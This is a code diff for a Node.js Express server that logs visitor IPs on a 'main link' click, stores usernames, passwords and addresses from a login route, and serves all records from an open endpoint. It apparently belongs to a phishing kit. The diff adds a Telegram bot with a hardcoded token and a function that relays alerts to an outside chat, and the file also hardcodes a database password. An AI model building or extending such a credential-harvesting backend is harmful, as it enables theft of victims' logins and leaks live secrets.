@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const { Pool } = require('pg');
+const fetch = require('node-fetch');   // Required for Telegram
 
 const app = express();
 app.use(express.json());
@@ -11,6 +12,27 @@ const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
+
+// Telegram Config
+const BOT_TOKEN = "8840000220:AAHAgXsHJVwYQp64ulKVCC7e4AoLvm4YWpY";
+const CHAT_ID = "6728113939";
+
+async function sendTelegramAlert(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            })
+        });
+        console.log("📱 Telegram Alert Sent");
+    } catch (err) {
+        console.error("Telegram Error:", err.message);
+    }
+}
 
 // Create Table
 pool.query(`CREATE TABLE IF NOT EXISTS records (
@@ -49,8 +71,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-
-// ==================== MAIN LINK CLICK (Most Important) ====================
+// ==================== ROUTES ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
@@ -70,7 +91,6 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true });
 });
 
-// Other routes
 app.get('/api/records', async (req, res) => {
     try {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
@@ -103,4 +123,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
-
